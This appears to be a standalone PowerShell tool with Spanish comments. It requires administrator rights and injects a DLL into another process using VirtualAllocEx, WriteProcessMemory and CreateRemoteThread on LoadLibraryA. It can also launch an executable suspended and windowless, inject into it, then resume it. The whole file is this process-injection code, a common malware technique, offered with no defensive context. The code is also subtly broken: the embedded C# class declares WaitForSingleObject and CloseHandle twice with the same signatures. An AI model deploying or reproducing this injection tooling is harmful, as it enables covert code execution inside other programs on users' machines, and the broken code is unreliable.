# Verifica si es admin
$IsAdmin = [Security.Principal.WindowsIdentity]::GetCurrent()
If (-not (New-Object Security.Principal.WindowsPrincipal $IsAdmin).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    return
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr numberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hHandle);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
}
"@

function Invoke-DllInjection {
    param (
        [int]$ProcessID,
        [string]$DllPath
    )

    $PROCESS_ALL_ACCESS = 0x001F0FFF
    $MEM_COMMIT = 0x1000
    $MEM_RESERVE = 0x2000
    $PAGE_READWRITE = 0x04
    $MEM_RELEASE = 0x8000
    $INFINITE = 0xFFFFFFFF

    $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $ProcessID)
    if ($hProcess -eq [IntPtr]::Zero) {
        return $false
    }

    $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($DllPath)

    $addr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
    if ($addr -eq [IntPtr]::Zero) {
        [Win32]::CloseHandle($hProcess) | Out-Null
        return $false
    }

    $written = [UIntPtr]::Zero
    $writeResult = [Win32]::WriteProcessMemory($hProcess, $addr, $dllBytes, [uint32]$dllBytes.Length, [ref]$written)
    if (-not $writeResult -or $written.ToUInt32() -ne $dllBytes.Length) {
        [Win32]::VirtualFreeEx($hProcess, $addr, 0, $MEM_RELEASE) | Out-Null
        [Win32]::CloseHandle($hProcess) | Out-Null
        return $false
    }

    $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
    $loadLibAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")

    $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) {
        [Win32]::VirtualFreeEx($hProcess, $addr, 0, $MEM_RELEASE) | Out-Null
        [Win32]::CloseHandle($hProcess) | Out-Null
        return $false
    }

    [Win32]::WaitForSingleObject($hThread, $INFINITE) | Out-Null

    [Win32]::VirtualFreeEx($hProcess, $addr, 0, $MEM_RELEASE) | Out-Null
    [Win32]::CloseHandle($hThread) | Out-Null
    [Win32]::CloseHandle($hProcess) | Out-Null

    return $true
}

function Invoke-CreateProcessAndInject {
    param(
        [string]$exePath,
        [string]$dllPath,
        [string]$args = ""
    )

    $si = New-Object Win32+STARTUPINFO
    $si.cb = [Runtime.InteropServices.Marshal]::SizeOf([Win32+STARTUPINFO])
    $pi = New-Object Win32+PROCESS_INFORMATION

    $CREATE_NO_WINDOW = 0x08000000
    $CREATE_SUSPENDED = 0x00000004

    $success = [Win32]::CreateProcess(
        $null,
        "`"$exePath`" $args",
        [IntPtr]::Zero,
        [IntPtr]::Zero,
        $false,
        $CREATE_SUSPENDED -bor $CREATE_NO_WINDOW,
        [IntPtr]::Zero,
        $null,
        [ref]$si,
        [ref]$pi
    )

    if (-not $success) {
        return $false
    }

    # Inyecta el DLL
    $injectResult = Invoke-DllInjection -ProcessID $pi.dwProcessId -DllPath $dllPath

    if (-not $injectResult) {
        # Si la inyección falla, cierra handles y termina proceso
        [Win32]::CloseHandle($pi.hThread) | Out-Null
        [Win32]::CloseHandle($pi.hProcess) | Out-Null
        return $false
    }

    # Reanuda el hilo principal para que el proceso arranque
    [Win32]::ResumeThread($pi.hThread) | Out-Null

    # Espera hasta que el proceso termine
    $INFINITE = 0xFFFFFFFF
    [Win32]::WaitForSingleObject($pi.hProcess, $INFINITE) | Out-Null

    # Cierra handles
    [Win32]::CloseHandle($pi.hThread) | Out-Null
    [Win32]::CloseHandle($pi.hProcess) | Out-Null

    return $true
}

